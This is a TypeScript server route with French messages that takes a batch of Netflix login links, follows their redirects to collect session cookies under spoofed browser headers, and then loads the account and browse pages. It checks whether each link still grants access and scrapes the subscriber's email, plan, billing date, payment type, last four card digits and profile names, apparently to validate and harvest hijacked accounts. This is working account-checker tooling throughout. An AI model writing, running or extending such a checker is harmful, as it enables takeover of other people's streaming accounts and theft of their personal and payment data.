function parseSetCookies(setCookieHeaders: string[] | string | null): Record<string, string> {
  const cookies: Record<string, string> = {};
  if (!setCookieHeaders) return cookies;

  const rawCookies = Array.isArray(setCookieHeaders)
    ? setCookieHeaders
    : [setCookieHeaders];

  for (const raw of rawCookies) {
    const cookiePair = raw.split(";")[0];
    const [name, ...rest] = cookiePair.split("=");
    if (!name || rest.length === 0) continue;
    cookies[name.trim()] = rest.join("=").trim();
  }

  return cookies;
}

type NetflixAccountInfo = Record<string, string | number | boolean | string[]>;

type DirectLoginResult = {
  index: number;
  url: string;
  isValid: boolean;
  finalUrl: string;
  status: number | null;
  message: string;
  profileNames?: string[];
  accountInfo?: NetflixAccountInfo;
};

function buildCookieHeader(cookies: Record<string, string>): string {
  return Object.entries(cookies)
    .map(([name, value]) => `${name}=${value}`)
    .join("; ");
}

function decodeNetflixEscapes(value: string): string {
  return value
    .replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)))
    .replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) => String.fromCharCode(parseInt(hex, 16)));
}

function parseNetflixBrowseProfiles(html: string): string[] {
  const names = new Set<string>();

  const addNames = (value: string) => {
    const parts = value
      .split(/,\s*/)
      .map((name) => name.trim())
      .filter((name) => name && name.length <= 50 && !name.includes("<") && !name.includes("/"));
    for (const part of parts) {
      if (part) names.add(part);
    }
  };

  let match: RegExpMatchArray | null;
  const profileNameRegex = /"profileName"\s*:\s*"([^"]+)"/g;
  while ((match = profileNameRegex.exec(html)) !== null) {
    addNames(match[1]);
  }

  const profileListRegex = /outerHTML[^\"]*\"([^\"]+)\"/g;
  while ((match = profileListRegex.exec(html)) !== null) {
    addNames(match[1]);
  }

  const profileArrayRegex = /"profiles"\s*:\s*\[([^\]]+)\]/g;
  if ((match = profileArrayRegex.exec(html)) !== null) {
    addNames(match[1]);
  }

  return Array.from(names).slice(0, 20);
}

function parseNetflixAccountInfo(html: string): NetflixAccountInfo {
  const info: NetflixAccountInfo = {};

  const captureString = (regex: RegExp): string | undefined => {
    const match = html.match(regex);
    return match ? decodeNetflixEscapes(match[1]) : undefined;
  };

  const memberSinceTimestamp = html.match(
    /"memberSince"\s*:\s*\{\s*"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*(\d+)/
  );
  if (memberSinceTimestamp) {
    const ts = Number(memberSinceTimestamp[1]);
    if (!Number.isNaN(ts)) {
      info.memberSince = new Date(ts).toISOString().split("T")[0];
    }
  } else {
    const memberSince = captureString(/"memberSince"\s*:\s*"([^"]+)"/);
    if (memberSince) info.memberSince = memberSince;
  }

  const planName = captureString(/"localizedPlanName"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/);
  const videoQuality = captureString(/"videoQuality"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/);
  const planPrice = captureString(/"planPrice"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/);
  const nextBillingDate = captureString(/"nextBillingDate"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/);
  const countryOfSignup = captureString(/"countryOfSignup"\s*:\s*"([^"]+)"/);
  const membershipStatus = captureString(/"membershipStatus"\s*:\s*"([^"]+)"/);
  const emailAddress = captureString(/"emailAddress"\s*:\s*"([^"]+)"/);

  const maxStreamsMatch = html.match(
    /"maxStreams"\s*:\s*\{\s*"fieldType"\s*:\s*"Numeric"\s*,\s*"value"\s*:\s*(\d+)/
  );
  const maxStreams = maxStreamsMatch ? Number(maxStreamsMatch[1]) : undefined;

  const paymentType = captureString(
    /"paymentMethods"\s*:\s*\{[^}]*"type"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/s
  );
  const paymentMethod = captureString(
    /"paymentMethod"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/s
  );
  const last4Digits = captureString(
    /"displayText"\s*:\s*\{\s*"fieldType"\s*:\s*"String"\s*,\s*"value"\s*:\s*"([^"]+)"/s
  );

  if (planName) info.planName = planName;
  if (videoQuality) info.videoQuality = videoQuality;
  if (planPrice) info.planPrice = planPrice;
  if (nextBillingDate) info.nextBillingDate = nextBillingDate;
  if (countryOfSignup) info.countryOfSignup = countryOfSignup;
  if (membershipStatus) info.membershipStatus = membershipStatus;
  if (emailAddress) info.emailAddress = emailAddress.replace(/\\x40/g, "@");
  if (typeof maxStreams === "number" && !Number.isNaN(maxStreams)) info.maxStreams = maxStreams;
  if (paymentType) info.paymentType = paymentType;
  if (paymentMethod) info.paymentMethod = paymentMethod;
  if (last4Digits) info.last4Digit = last4Digits;

  const profiles = parseNetflixBrowseProfiles(html);
  if (profiles.length > 0) {
    info.profiles = profiles;
  }

  return info;
}

async function followRedirects(
  startUrl: string,
  headers: Record<string, string>,
  maxRedirects = 10
): Promise<{ finalUrl: string; status: number; cookies: Record<string, string>; loginRedirect: boolean }> {
  let currentUrl = startUrl;
  const cookies: Record<string, string> = {};
  let status = 0;
  let loginRedirect = false;

  for (let redirectCount = 0; redirectCount < maxRedirects; redirectCount++) {
    const response = await fetch(currentUrl, {
      headers: {
        ...headers,
        Cookie: buildCookieHeader(cookies),
      },
      redirect: "manual",
    });

    status = response.status;
    Object.assign(cookies, parseSetCookies(response.headers.get("set-cookie")));

    const location = response.headers.get("location") || "";
    if (location && [301, 302, 303, 307, 308].includes(status)) {
      const nextUrl = new URL(location, currentUrl).toString();
      if (nextUrl.toLowerCase().includes("login")) {
        loginRedirect = true;
        return { finalUrl: nextUrl, status, cookies, loginRedirect };
      }
      currentUrl = nextUrl;
      continue;
    }

    return { finalUrl: currentUrl, status, cookies, loginRedirect };
  }

  return { finalUrl: currentUrl, status, cookies, loginRedirect };
}

export async function action({ request }: { request: Request }) {
  if (request.method !== "POST") {
    return new Response("Method not allowed", { status: 405 });
  }

  const { urls } = await request.json();

  if (!urls || typeof urls !== "string") {
    return new Response(
      JSON.stringify({ type: "error", message: "Aucun lien fourni" }),
      { status: 400, headers: { "Content-Type": "application/json" } }
    );
  }

  const lines = urls
    .replace(/\r/g, "")
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line && !line.startsWith("#"));

  if (lines.length === 0) {
    return new Response(
      JSON.stringify({ type: "error", message: "Aucun lien trouve" }),
      { status: 400, headers: { "Content-Type": "application/json" } }
    );
  }

  const headers: Record<string, string> = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    Accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Sec-Ch-Ua": '"Chromium";v="135", "Not-A.Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Upgrade-Insecure-Requests": "1",
  };

  const stream = new ReadableStream({
    async start(controller) {
      const encoder = new TextEncoder();
      controller.enqueue(
        encoder.encode(JSON.stringify({ type: "init", total: lines.length }) + "\n")
      );

      let validCount = 0;
      let invalidCount = 0;

      for (let i = 0; i < lines.length; i++) {
        const raw = lines[i];
        let urlString = raw;
        if (!/^https?:\/\//i.test(urlString) && /^www\./i.test(urlString)) {
          urlString = `https://${urlString}`;
        }

        let result: DirectLoginResult = {
          index: i + 1,
          url: raw,
          isValid: false,
          finalUrl: "",
          status: null,
          message: "",
        };

        if (!/^https?:\/\//i.test(urlString)) {
          result.message = "Lien invalide ou protocole manquant";
        } else {
          try {
            new URL(urlString);
          } catch {
            result.message = "URL invalide";
          }
        }

        if (!result.message) {
          try {
            const firstVisit = await followRedirects(urlString, headers);
            await new Promise((resolve) => setTimeout(resolve, 15000));

            const accountResp = await fetch("https://www.netflix.com/account", {
              headers: {
                ...headers,
                Cookie: buildCookieHeader(firstVisit.cookies),
              },
              redirect: "manual",
            });

            const accountLocation = accountResp.headers.get("location") || "";
            const accountHtml = await accountResp.text();
            const accountInfo = parseNetflixAccountInfo(accountHtml);
            const profileNames = parseNetflixBrowseProfiles(accountHtml);
            const accountLocationLower = accountLocation.toLowerCase();
            const accountLoginRedirect = accountLocationLower.includes("/login");
            let accountOk = accountResp.status === 200 && Object.keys(accountInfo).length > 0;
            let finalUrl = accountOk ? "https://www.netflix.com/account" : firstVisit.finalUrl;
            let message = accountOk
              ? `Valide - /account accessible`
              : `Invalide - /account non accessible`;
            let resultProfileNames = profileNames;

            if (!accountOk && accountLoginRedirect) {
              await new Promise((resolve) => setTimeout(resolve, 5000));

              const browseResp = await fetch("https://www.netflix.com/browse", {
                headers: {
                  ...headers,
                  Cookie: buildCookieHeader(firstVisit.cookies),
                },
                redirect: "manual",
              });

              const browseHtml = await browseResp.text();
              const browseNames = parseNetflixBrowseProfiles(browseHtml);
              const browseOk = browseResp.status === 200 && browseNames.length > 0;

              if (browseOk) {
                accountOk = true;
                finalUrl = "https://www.netflix.com/browse";
                message = `Valide - /browse accessible après redirection login`;
                resultProfileNames = browseNames;
              }
            }

            result = {
              ...result,
              isValid: accountOk,
              finalUrl,
              status: accountResp.status,
              message,
              profileNames: resultProfileNames,
              accountInfo,
            };
          } catch (error) {
            result = {
              ...result,
              isValid: false,
              message: `Erreur de connexion: ${error instanceof Error ? error.message : "Inconnue"}`,
            };
          }
        }

        if (result.isValid) {
          validCount += 1;
        } else {
          invalidCount += 1;
        }

        const progress = Math.round(((i + 1) / lines.length) * 100);
        controller.enqueue(
          encoder.encode(JSON.stringify({ type: "result", data: result, progress }) + "\n")
        );

        await new Promise((resolve) => setTimeout(resolve, 200));
      }

      controller.enqueue(
        encoder.encode(JSON.stringify({ type: "done", total: lines.length, valid: validCount, invalid: invalidCount }) + "\n")
      );
      controller.close();
    },
  });

  return new Response(stream, {
    headers: {
      "Content-Type": "application/x-ndjson",
      "Transfer-Encoding": "chunked",
      "Cache-Control": "no-cache",
      Connection: "keep-alive",
    },
  });
}
